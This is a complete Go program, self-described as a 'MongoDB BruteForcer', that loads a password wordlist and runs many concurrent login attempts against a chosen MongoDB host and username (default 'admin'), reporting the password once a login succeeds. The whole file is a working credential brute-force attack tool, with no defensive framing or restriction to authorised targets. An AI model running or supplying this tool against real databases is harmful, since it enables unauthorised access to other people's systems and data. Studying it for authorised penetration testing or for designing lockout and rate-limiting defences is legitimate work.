package main

import (
	"flag"
	"fmt"
	"labix.org/v2/mgo"
	"bytes"
	"io/ioutil"
	"os"
)

var VERBOSE bool
var PASSFILE string
var HOSTNAME string
var DB string
var USERNAME string
var THREADS int

var COUNT int
var TOTAL_WORDS int

func login(db *mgo.Database, user, pass []byte) bool {

	// XXX: Check to make sure DB is still valid?
	err := db.Login(string(user[:]), string(pass[:]))
	if err == nil {
		return true
	}
	return false
}

func loadPasswords(filename string) [][]byte {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		panic(err)
	}
	words := bytes.Split(data, []byte{'\n'})

	fmt.Println("Loaded password list! Total words:", len(words))
	TOTAL_WORDS = len(words)
	return words
}

func sessionBuilder(hostname, dbName string) (*mgo.Session, *mgo.Database) {
	session, err := mgo.Dial(hostname)
	if err != nil {
		fmt.Println("Error building session")
		panic(err)
	}
	session.SetMode(mgo.Monotonic, true)
	db := session.DB(dbName)
	return session, db
}

func passwordProducer(filename string, passwordChan chan []byte) {
	passwords := loadPasswords(filename)
	for _, password := range passwords {
		passwordChan<- password
	}
}
 
func passwordConsumer(id int, user []byte, passwordChan chan []byte) {
	session, db := sessionBuilder(HOSTNAME, DB)
	count := 0
	defer session.Close()

	for {
		password := <-passwordChan

		if VERBOSE {
			fmt.Printf("%d:\tcount: %d/%d, %s:%s\n", id, count, COUNT, user, password)
		}

		if login(db, user, password) {
			fmt.Printf("WE DID IT!\n")
			fmt.Printf("Password is %s:%s\n", user, password)
			os.Exit(0)
		}

		count++
		COUNT++
	}	
}

func main () {
	fmt.Println("-------- MongoDB BruteForcer -------")
	flag.BoolVar(&VERBOSE, "verbose", false, "display each attempt")
	flag.StringVar(&HOSTNAME, "hostname", "127.0.0.1", "hostname containing MongoDB")
	flag.StringVar(&PASSFILE, "passfile", "pass.pass", "location of password file")
	flag.StringVar(&DB, "database", "admin", "name of database to use")
	flag.StringVar(&USERNAME, "username", "admin", "username to bruteforce")
	flag.IntVar(&THREADS, "threads", 16, "number of db connections to use per machine")
	flag.Parse()

	passwordChannel := make(chan []byte, 10 * THREADS)
	username := []byte(USERNAME)

	for i := 0; i < THREADS; i++ {
		go passwordConsumer(i, username, passwordChannel)
	}
	
	passwordProducer(PASSFILE, passwordChannel)
	
}